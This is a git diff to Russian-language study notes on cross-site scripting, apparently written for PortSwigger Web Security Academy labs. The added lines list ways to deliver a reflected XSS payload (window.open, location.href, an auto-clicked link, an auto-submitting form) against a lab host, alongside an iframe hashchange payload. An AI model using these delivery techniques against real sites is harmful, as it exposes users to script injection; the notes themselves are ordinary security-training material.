@@ -139,3 +139,22 @@ $(window).on('hashchange', function(){
 ```html
 <iframe src="https://vuln-site-with-hashchange-func.com/#" onload="this.src+='<img src=1 onerror=print()>'">
 ```
+
+### Если нужно использовать iframe для встраивания для него страницы с xss, то можно использовать
+
+* 1. Windows.open(http://...);
+* 2. location.href = "";
+* 3. Ссылка с автоматическим кликом
+<a id="xss" href="https://0af300960427f0df809c12ff00650059.web-security-academy.net/?search=%3C%2Fh1%3E%3Canimate%20onmouseover=alert(1)%3Ehello%3C%2Fhello%3E">Click</a>
+<script>
+    document.getElementById('xss').click();
+</script>
+
+* 4. Форма с автосабмитом
+<form action="https://0af300960427f0df809c12ff00650059.web-security-academy.net/" method="GET">
+    <input name="search" value="</h1><animate onmouseover=alert(1)>hello</hello>">
+    <input type="submit">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
